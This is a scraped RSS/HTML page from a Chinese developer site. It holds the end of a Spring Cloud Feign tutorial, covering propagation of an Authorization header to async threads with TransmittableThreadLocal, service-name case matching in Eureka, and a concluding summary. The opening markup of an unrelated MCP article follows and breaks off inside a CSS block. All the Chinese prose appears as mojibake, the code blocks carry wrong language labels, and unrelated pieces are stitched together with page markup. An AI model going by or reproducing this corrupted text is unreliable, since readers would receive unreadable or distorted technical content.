<p>åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼ŒasyncTaskæ–¹æ³•æ˜¯ä¸€ä¸ªå¼‚æ­¥æ–¹æ³•ï¼Œå½“å®ƒåœ¨æ–°çš„çº¿ç¨‹ä¸­æ‰§è¡Œ Feign è°ƒç”¨æ—¶ï¼Œç”±äºæ–°çº¿ç¨‹æ— æ³•è·å–ä¸»çº¿ç¨‹çš„ThreadLocalä¸­çš„Authorizationå¤´ä¿¡æ¯ï¼Œå¯¼è‡´FeignAuthInterceptoræ— æ³•æ­£ç¡®è·å–å¹¶æ·»åŠ  Headerï¼Œä»è€Œä½¿è¿œç¨‹è°ƒç”¨ç¼ºå°‘å¿…è¦çš„èº«ä»½éªŒè¯ä¿¡æ¯ï¼Œæœ€ç»ˆå¯èƒ½å¯¼è‡´è°ƒç”¨å¤±è´¥ã€‚</p>
<p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨TransmittableThreadLocalæ¥æ›¿ä»£åŸç”Ÿçš„ThreadLocalã€‚TransmittableThreadLocalèƒ½å¤Ÿåœ¨å­çº¿ç¨‹ä¸­ä¼ é€’çˆ¶çº¿ç¨‹çš„ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œç¡®ä¿ Header ä¿¡æ¯ä¸ä¼šä¸¢å¤±ã€‚é¦–å…ˆï¼Œå¼•å…¥transmittable-thread-localä¾èµ–ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>transmittable-thread-local<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.12.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>ç„¶åï¼Œä¿®æ”¹FeignAuthInterceptorï¼Œä½¿ç”¨TransmittableThreadLocalæ¥ä¼ é€’ä¸Šä¸‹æ–‡ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> com.<span class="hljs-property">alibaba</span>.<span class="hljs-property">ttl</span>.<span class="hljs-property">TransmittableThreadLocal</span>;
<span class="hljs-keyword">import</span> feign.<span class="hljs-property">RequestInterceptor</span>;
<span class="hljs-keyword">import</span> feign.<span class="hljs-property">RequestTemplate</span>;
<span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">stereotype</span>.<span class="hljs-property">Component</span>;
<span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">web</span>.<span class="hljs-property">context</span>.<span class="hljs-property">request</span>.<span class="hljs-property">RequestContextHolder</span>;
<span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">web</span>.<span class="hljs-property">context</span>.<span class="hljs-property">request</span>.<span class="hljs-property">ServletRequestAttributes</span>;

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FeignAuthInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RequestInterceptor</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> final <span class="hljs-title class_">TransmittableThreadLocal</span>&lt;<span class="hljs-title class_">String</span>&gt; tokenThreadLocal = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransmittableThreadLocal</span>&lt;&gt;();

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">apply</span>(<span class="hljs-params">RequestTemplate template</span>) {
        <span class="hljs-title class_">String</span> token = tokenThreadLocal.<span class="hljs-title function_">get</span>();
        <span class="hljs-keyword">if</span> (token != <span class="hljs-literal">null</span>) {
            template.<span class="hljs-title function_">header</span>(<span class="hljs-string">"Authorization"</span>, token);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setToken</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> token</span>) {
        tokenThreadLocal.<span class="hljs-title function_">set</span>(token);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">removeToken</span>(<span class="hljs-params"/>) {
        tokenThreadLocal.<span class="hljs-title function_">remove</span>();
    }
}
</code></pre>
<p>åœ¨è°ƒç”¨å¼‚æ­¥æ–¹æ³•å‰ï¼Œå°†Authorizationå¤´ä¿¡æ¯è®¾ç½®åˆ°TransmittableThreadLocalä¸­ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">import org.springframework.web.context.request.RequestContextHolder<span class="hljs-comment">;</span>
import org.springframework.web.context.request.ServletRequestAttributes<span class="hljs-comment">;</span>

public class MainService {

    public void mainMethod() {
        ServletRequestAttributes <span class="hljs-attr">attributes</span> = (ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()<span class="hljs-comment">;</span>
        if (attributes != null) {
            String <span class="hljs-attr">token</span> = attributes.getRequest().getHeader(<span class="hljs-string">"Authorization"</span>)<span class="hljs-comment">;</span>
            FeignAuthInterceptor.setToken(token)<span class="hljs-comment">;</span>
        }
        userService.asyncTask()<span class="hljs-comment">;</span>
        FeignAuthInterceptor.removeToken()<span class="hljs-comment">;</span>
    }
}
</code></pre>
<p>é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå³ä½¿åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ï¼Œä¹Ÿèƒ½ç¡®ä¿ Feign è°ƒç”¨æ—¶ Header ä¿¡æ¯çš„æ­£ç¡®ä¼ é€’ï¼Œé¿å…å› ä¸Šä¸‹æ–‡ä¸¢å¤±è€Œå¯¼è‡´çš„è°ƒç”¨å¤±è´¥é—®é¢˜ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/759a19ddf5ec43888bf84fab7cd95e45~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH5bCP5rGk5ZyG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771228108&amp;x-signature=cruW4askrHr%2FsyfS6ZfKnYBYAoA%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-28"><strong>5.3 æœåŠ¡åå¤§å°å†™é—®é¢˜ï¼šæ³¨å†Œä¸­å¿ƒçš„ â€œä¸¥æ ¼åŒ¹é…â€</strong></h3>
<p>åœ¨ä½¿ç”¨ Feign è¿›è¡ŒæœåŠ¡è°ƒç”¨æ—¶ï¼Œ@FeignClientæ³¨è§£çš„nameå±æ€§æŒ‡å®šçš„æœåŠ¡åå¿…é¡»ä¸æœåŠ¡æ³¨å†Œä¸­å¿ƒä¸­æ³¨å†Œçš„æœåŠ¡åå®Œå…¨ä¸€è‡´ï¼ŒåŒ…æ‹¬å¤§å°å†™ã€‚è¿™ä¸€ç‚¹åœ¨å®é™…é¡¹ç›®ä¸­å®¹æ˜“è¢«å¿½è§†ï¼Œä»è€Œå¯¼è‡´ Feign æ— æ³•æ‰¾åˆ°å¯¹åº”çš„æœåŠ¡å®ä¾‹ï¼Œå¼•å‘è°ƒç”¨å¤±è´¥çš„é”™è¯¯ã€‚</p>
<p>ä»¥ Eureka æœåŠ¡æ³¨å†Œä¸­å¿ƒä¸ºä¾‹ï¼Œå‡è®¾æˆ‘ä»¬åœ¨ Eureka ä¸­æ³¨å†Œäº†ä¸€ä¸ªåä¸ºUser-Serviceçš„æœåŠ¡ï¼ŒæœåŠ¡åé‡‡ç”¨äº†å¤§å†™å­—æ¯å’Œä¸­åˆ’çº¿çš„ç»„åˆã€‚æ­¤æ—¶ï¼Œå¦‚æœåœ¨ Feign å®¢æˆ·ç«¯ä¸­ä½¿ç”¨@FeignClient(name = "user-service")ï¼ˆæ³¨æ„è¿™é‡Œçš„æœåŠ¡åå…¨éƒ¨å°å†™ï¼‰æ¥è°ƒç”¨è¯¥æœåŠ¡ï¼ŒFeign å°†æ— æ³•åœ¨ Eureka ä¸­æ‰¾åˆ°åŒ¹é…çš„æœåŠ¡å®ä¾‹ï¼Œå› ä¸º Eureka å¯¹æœåŠ¡åçš„åŒ¹é…æ˜¯å¤§å°å†™æ•æ„Ÿçš„ã€‚</p>
<p>æ­£ç¡®çš„åšæ³•æ˜¯ç¡®ä¿@FeignClientæ³¨è§£ä¸­çš„nameå±æ€§ä¸æœåŠ¡æ³¨å†Œä¸­å¿ƒä¸­çš„æœåŠ¡åå®Œå…¨ä¸€è‡´ï¼Œå³@FeignClient(name = "User-Service")ã€‚è¿™æ ·ï¼ŒFeign æ‰èƒ½å‡†ç¡®åœ°ä»æœåŠ¡æ³¨å†Œä¸­å¿ƒè·å–åˆ°æœåŠ¡å®ä¾‹çš„åœ°å€ä¿¡æ¯ï¼Œå¹¶è¿›è¡Œåç»­çš„è¿œç¨‹è°ƒç”¨ã€‚</p>
<p>åœ¨å›¢é˜Ÿå¼€å‘ä¸­ï¼Œä¸ºäº†é¿å…å› æœåŠ¡åå¤§å°å†™é—®é¢˜å¯¼è‡´çš„è°ƒç”¨å¤±è´¥ï¼Œå»ºè®®åˆ¶å®šç»Ÿä¸€çš„æœåŠ¡å‘½åè§„èŒƒï¼Œä¾‹å¦‚å…¨éƒ¨é‡‡ç”¨å°å†™å­—æ¯åŠ ä¸‹åˆ’çº¿çš„æ–¹å¼ï¼ˆå¦‚user_serviceï¼‰ï¼Œæˆ–è€…å…¨éƒ¨é‡‡ç”¨å¤§å†™å­—æ¯åŠ ä¸­åˆ’çº¿çš„æ–¹å¼ï¼ˆå¦‚USER-SERVICEï¼‰ã€‚åŒæ—¶ï¼Œåœ¨æ³¨å†ŒæœåŠ¡å’Œå®šä¹‰ Feign å®¢æˆ·ç«¯æ—¶ï¼Œä¸¥æ ¼æŒ‰ç…§è§„èŒƒè¿›è¡Œå‘½åï¼Œä»¥å‡å°‘å› å‘½åä¸ä¸€è‡´è€Œå¸¦æ¥çš„æ½œåœ¨é—®é¢˜ï¼Œæé«˜ç³»ç»Ÿçš„ç¨³å®šæ€§å’Œå¯ç»´æŠ¤æ€§ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f440c44bee534f838966d52680a5a7d2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH5bCP5rGk5ZyG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771228108&amp;x-signature=8qviWQCrPIk%2BQv%2FK7BmZChCBnuc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-29"><strong>å…­ã€æ€»ç»“ä¸å±•æœ›ï¼šFeign åœ¨å¾®æœåŠ¡æ¶æ„ä¸­çš„ä»·å€¼</strong></h2>
<p>åœ¨å½“ä»Šå¤æ‚å¤šå˜çš„å¾®æœåŠ¡æ¶æ„é¢†åŸŸï¼ŒFeign å‡­å€Ÿå…¶ç‹¬ç‰¹çš„ä¼˜åŠ¿ï¼Œå·²ç„¶æˆä¸º Spring é¡¹ç›®ä¸­ä¸å¯æˆ–ç¼ºçš„å…³é”®ç»„ä»¶ï¼Œå‘æŒ¥ç€ä¸¾è¶³è½»é‡çš„ä½œç”¨ã€‚</p>
<p>å›é¡¾ Feign çš„æ ¸å¿ƒä»·å€¼ï¼Œé¦–å½“å…¶å†²çš„ä¾¿æ˜¯å…¶ç®€æ´ç›´è§‚çš„å£°æ˜å¼è°ƒç”¨æ–¹å¼ã€‚é€šè¿‡ â€œæ¥å£ + æ³¨è§£â€ è¿™ä¸€åˆ›æ–°æ¨¡å¼ï¼ŒFeign å°†åŸæœ¬ç¹çå¤æ‚çš„è¿œç¨‹è°ƒç”¨è¿‡ç¨‹è¿›è¡Œäº†é«˜åº¦æŠ½è±¡ä¸ç®€åŒ–ï¼Œä½¿å¾—å¼€å‘è€…èƒ½å¤Ÿä»¥è°ƒç”¨æœ¬åœ°æ–¹æ³•çš„æ€ç»´å’Œæ–¹å¼æ¥å¤„ç†è¿œç¨‹æœåŠ¡é—´çš„é€šä¿¡ã€‚è¿™ä¸ä»…å¤§å¹…é™ä½äº†å¼€å‘çš„éš¾åº¦å’Œå·¥ä½œé‡ï¼Œå‡å°‘äº†å› æ‰‹åŠ¨å¤„ç† HTTP è¯·æ±‚ç»†èŠ‚è€Œå¯èƒ½å¼•å‘çš„é”™è¯¯ï¼Œè¿˜æ˜¾è‘—æå‡äº†ä»£ç çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚å°±å¦‚åŒåœ¨ä¸€ä¸ªåºå¤§çš„å»ºç­‘é¡¹ç›®ä¸­ï¼ŒFeign ä¸ºå¼€å‘è€…æä¾›äº†ä¸€å¥—æ ‡å‡†åŒ–ã€æ¨¡å—åŒ–çš„æ„å»ºå·¥å…·ï¼Œä½¿å¾—å„ä¸ªå¾®æœåŠ¡ä¹‹é—´çš„äº¤äº’å˜å¾—æ›´åŠ é¡ºç•…ã€é«˜æ•ˆã€‚</p>
<p>æ— ç¼é›†æˆ Spring ç”Ÿæ€ç³»ç»Ÿï¼Œæ˜¯ Feign çš„åˆä¸€çªå‡ºä¼˜åŠ¿ã€‚å®ƒä¸ Spring Bootã€Spring Cloud ç­‰ç»„ä»¶ç´§å¯†ç»“åˆï¼Œç›¸å¾—ç›Šå½°ï¼Œå……åˆ†åˆ©ç”¨äº† Spring æ¡†æ¶å¼ºå¤§çš„ä¾èµ–æ³¨å…¥ã€é…ç½®ç®¡ç†ç­‰åŠŸèƒ½ï¼Œå®ç°äº†ä¸ç°æœ‰ Spring é¡¹ç›®çš„æ·±åº¦èåˆã€‚è¿™ç§æ·±åº¦é›†æˆä¸ä»…å‡å°‘äº†æŠ€æœ¯é€‰å‹å’Œæ¶æ„æ­å»ºçš„æˆæœ¬ï¼Œè¿˜ä¸ºå¼€å‘è€…æä¾›äº†ç»Ÿä¸€çš„å¼€å‘ä½“éªŒå’Œç¼–ç¨‹æ¨¡å‹ï¼Œä½¿å¾—åŸºäº Spring çš„å¾®æœåŠ¡å¼€å‘æ›´åŠ ä¾¿æ·ã€é«˜æ•ˆã€‚ä¾‹å¦‚ï¼Œåœ¨ä¸€ä¸ªåŸºäº Spring Cloud çš„ç”µå•†ç³»ç»Ÿä¸­ï¼ŒFeign å¯ä»¥è½»æ¾åœ°ä¸ Eurekaã€Nacos ç­‰æœåŠ¡æ³¨å†Œä¸­å¿ƒé…åˆï¼Œå®ç°æœåŠ¡çš„è‡ªåŠ¨å‘ç°ä¸è°ƒç”¨ï¼Œä¸ Ribbonã€Spring Cloud LoadBalancer ç­‰è´Ÿè½½å‡è¡¡ç»„ä»¶ååŒå·¥ä½œï¼Œç¡®ä¿è¯·æ±‚èƒ½å¤Ÿå‡åŒ€åœ°åˆ†å‘åˆ°å„ä¸ªæœåŠ¡å®ä¾‹ä¸Šï¼Œä»è€Œæé«˜ç³»ç»Ÿçš„æ•´ä½“æ€§èƒ½å’Œå¯ç”¨æ€§ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0e8ba02295b449819b6164bf42565457~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH5bCP5rGk5ZyG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771228108&amp;x-signature=IqgR7C6XjMz26%2Be4wCPmHEWbOYc%3D" alt="" loading="lazy"/></p>
<p>æ­¤å¤–ï¼ŒFeign åœ¨è´Ÿè½½å‡è¡¡å’Œç†”æ–­é™çº§æ–¹é¢çš„å‡ºè‰²è¡¨ç°ï¼Œä¸ºæ„å»ºé«˜å¯ç”¨ã€é«˜æ€§èƒ½çš„å¾®æœåŠ¡æ¶æ„æä¾›äº†åšå®çš„ä¿éšœã€‚ç»“åˆ Ribbon æˆ– Spring Cloud LoadBalancer ç­‰è´Ÿè½½å‡è¡¡ç»„ä»¶ï¼ŒFeign èƒ½å¤Ÿæ ¹æ®é¢„è®¾çš„ç­–ç•¥ï¼Œå°†è¯·æ±‚æ™ºèƒ½åœ°åˆ†å‘åˆ°å¤šä¸ªæœåŠ¡å®ä¾‹ä¸Šï¼Œæœ‰æ•ˆé¿å…äº†å•ä¸ªæœåŠ¡å®ä¾‹å› è´Ÿè½½è¿‡é«˜è€Œå¯¼è‡´çš„æ€§èƒ½ç“¶é¢ˆå’Œæ•…éšœã€‚åŒæ—¶ï¼Œé€šè¿‡ä¸ Hystrixã€Sentinel ç­‰ç†”æ–­é™çº§ç»„ä»¶çš„é›†æˆï¼ŒFeign èƒ½å¤Ÿåœ¨æœåŠ¡å‡ºç°æ•…éšœæˆ–ä¸å¯ç”¨æ—¶ï¼ŒåŠæ—¶è§¦å‘ç†”æ–­æœºåˆ¶ï¼Œå¿«é€Ÿè¿”å›é™çº§ç»“æœï¼Œé¿å…äº†å› æœåŠ¡æ•…éšœè€Œå¼•å‘çš„è¿é”ååº”å’ŒæœåŠ¡é›ªå´©æ•ˆåº”ï¼Œç¡®ä¿äº†ç³»ç»Ÿçš„ç¨³å®šæ€§å’Œå¯é æ€§ã€‚</p>
<p>å±•æœ›æœªæ¥ï¼Œéšç€å¾®æœåŠ¡æ¶æ„çš„ä¸æ–­å‘å±•å’Œæ¼”è¿›ï¼ŒFeign æœ‰æœ›ä¸æ›´å¤šæ–°å…´çš„æŠ€æœ¯å’Œç»„ä»¶å®ç°æ·±åº¦èåˆä¸ååŒåˆ›æ–°ã€‚ä¾‹å¦‚ï¼Œä¸ Spring Cloud Gateway è¿™ä¸€æ–°ä¸€ä»£çš„ç½‘å…³ç»„ä»¶ç›¸ç»“åˆï¼ŒFeign å¯ä»¥åœ¨ç½‘å…³å±‚é¢å®ç°æ›´åŠ çµæ´»ã€é«˜æ•ˆçš„æœåŠ¡è·¯ç”±å’Œè½¬å‘ã€‚Spring Cloud Gateway æä¾›äº†ä¸°å¯Œçš„è·¯ç”±è§„åˆ™å’Œè¿‡æ»¤å™¨åŠŸèƒ½ï¼Œèƒ½å¤Ÿå¯¹è¯·æ±‚è¿›è¡Œæ›´ç»†ç²’åº¦çš„æ§åˆ¶å’Œå¤„ç†ï¼Œè€Œ Feign åˆ™ä¸“æ³¨äºæœåŠ¡é—´çš„é€šä¿¡ï¼Œä¸¤è€…ç»“åˆå¯ä»¥å®ç°ä»ç½‘å…³åˆ°å¾®æœåŠ¡çš„å…¨é“¾è·¯ä¼˜åŒ–ï¼Œè¿›ä¸€æ­¥æå‡ç³»ç»Ÿçš„æ€§èƒ½å’Œå®‰å…¨æ€§ã€‚åœ¨ä¸€ä¸ªå¤§å‹çš„åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼ŒSpring Cloud Gateway å¯ä»¥æ ¹æ®è¯·æ±‚çš„è·¯å¾„ã€å‚æ•°ç­‰ä¿¡æ¯ï¼Œå°†è¯·æ±‚ç²¾å‡†åœ°è·¯ç”±åˆ°å¯¹åº”çš„å¾®æœåŠ¡ï¼Œç„¶åç”± Feign å®Œæˆå¾®æœåŠ¡ä¹‹é—´çš„è°ƒç”¨ï¼ŒåŒæ—¶åˆ©ç”¨ Feign çš„è´Ÿè½½å‡è¡¡å’Œç†”æ–­é™çº§åŠŸèƒ½ï¼Œç¡®ä¿æ•´ä¸ªè°ƒç”¨è¿‡ç¨‹çš„ç¨³å®šå’Œé«˜æ•ˆã€‚</p>
<p>æ­¤å¤–ï¼ŒFeign ä¸ Sentinel ç­‰æµé‡æ§åˆ¶ç»„ä»¶çš„ååŒä½¿ç”¨ä¹Ÿå°†æˆä¸ºæœªæ¥çš„å‘å±•è¶‹åŠ¿ã€‚Sentinel ä½œä¸ºä¸€æ¬¾å¼ºå¤§çš„æµé‡æ§åˆ¶å’Œç†”æ–­é™çº§æ¡†æ¶ï¼Œèƒ½å¤Ÿå¯¹æœåŠ¡çš„æµé‡è¿›è¡Œå®æ—¶ç›‘æ§å’Œç²¾å‡†æ§åˆ¶ï¼Œä¸ Feign é›†æˆåï¼Œå¯ä»¥å®ç°å¯¹ Feign è°ƒç”¨çš„å…¨æ–¹ä½ä¿æŠ¤ã€‚åœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹ï¼ŒSentinel å¯ä»¥æ ¹æ®é¢„è®¾çš„æµé‡è§„åˆ™ï¼Œå¯¹ Feign çš„è°ƒç”¨è¿›è¡Œé™æµã€é™çº§ç­‰æ“ä½œï¼Œç¡®ä¿æœåŠ¡åœ¨é¢å¯¹çªå‘æµé‡æ—¶èƒ½å¤Ÿä¿æŒç¨³å®šè¿è¡Œï¼Œé¿å…å› æµé‡è¿‡å¤§è€Œå¯¼è‡´çš„ç³»ç»Ÿå´©æºƒã€‚åŒæ—¶ï¼ŒSentinel è¿˜æä¾›äº†ä¸°å¯Œçš„ç›‘æ§å’ŒæŠ¥è­¦åŠŸèƒ½ï¼Œèƒ½å¤ŸåŠæ—¶å‘ç°å’Œå¤„ç†æœåŠ¡è°ƒç”¨è¿‡ç¨‹ä¸­å‡ºç°çš„å¼‚å¸¸æƒ…å†µï¼Œä¸ºç³»ç»Ÿçš„ç¨³å®šè¿è¡Œæä¾›äº†æœ‰åŠ›çš„æ”¯æŒã€‚</p>
<p>Feign ä½œä¸º Spring é¡¹ç›®ä¸­å¾®æœåŠ¡è¿œç¨‹è°ƒç”¨çš„åˆ©å™¨ï¼Œå‡­å€Ÿå…¶æ ¸å¿ƒä»·å€¼å’Œå¼ºå¤§åŠŸèƒ½ï¼Œå·²ç»åœ¨ä¼—å¤šé¡¹ç›®ä¸­å¾—åˆ°äº†å¹¿æ³›çš„åº”ç”¨å’ŒéªŒè¯ã€‚åœ¨æœªæ¥ï¼Œéšç€ä¸æ›´å¤šå…ˆè¿›æŠ€æœ¯å’Œç»„ä»¶çš„èåˆä¸åˆ›æ–°ï¼ŒFeign å°†ç»§ç»­å‘æŒ¥é‡è¦ä½œç”¨ï¼ŒåŠ©åŠ›å¼€å‘è€…æ„å»ºæ›´åŠ é«˜æ•ˆã€ç¨³å®šã€å¯é çš„å¾®æœåŠ¡æ¶æ„ï¼Œä¸ºä¼ä¸šçš„æ•°å­—åŒ–è½¬å‹å’Œåˆ›æ–°å‘å±•æä¾›åšå®çš„æŠ€æœ¯æ”¯æ’‘ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1039b4b1a2e943fab23789222dfdbb57~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH5bCP5rGk5ZyG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771228108&amp;x-signature=zsTrJM4rpdJoLIT9sx%2BOokBZBUA%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MCP (Model Context Protocol) æŠ€æœ¯ç†è§£ - ç¬¬ä¸€ç¯‡]]></title>    <link>https://juejin.cn/post/7604037348607082534</link>    <guid>https://juejin.cn/post/7604037348607082534</guid>    <pubDate>2026-02-08T10:07:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604037348607082534" data-draft-id="7593171168259571721" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MCP (Model Context Protocol) æŠ€æœ¯ç†è§£ - ç¬¬ä¸€ç¯‡"/> <meta itemprop="keywords" content="åç«¯,AIGC,MCP"/> <meta itemprop="datePublished" content="2026-02-08T10:07:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æƒ³ç”¨offeræ‰“ç‰Œ"/> <meta itemprop="url" content="https://juejin.cn/user/578781641968972"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MCP (Model Context Protocol) æŠ€æœ¯ç†è§£ - ç¬¬ä¸€ç¯‡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/578781641968972/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æƒ³ç”¨offeræ‰“ç‰Œ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-08T10:07:19.000Z" title="Sun Feb 08 2026 10:07:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.8;font-weight:400;font-size:16px;word-spacing:2px;letter-spacing:2px;overflow-x:hidden;color:#3e3e3e;background-image:linear-gradient(90deg,rgba(50,0,0,.05) 3%,transparent 0),linear-gradient(1turn,rgba(50,0,0,.05) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{padding-bottom:12px;font-size:24px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:1.2em;border-bottom:2px solid #ef7060;word-spacing:0!important;letter-spacing:0!important;font-size:inherit;line-height:inherit;display:block;font-weight:400;background:#ef7060;color:#fff;padding:10px;border-top-right-radius:3px;border-top-left-radius:3px;margin-right:3px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul 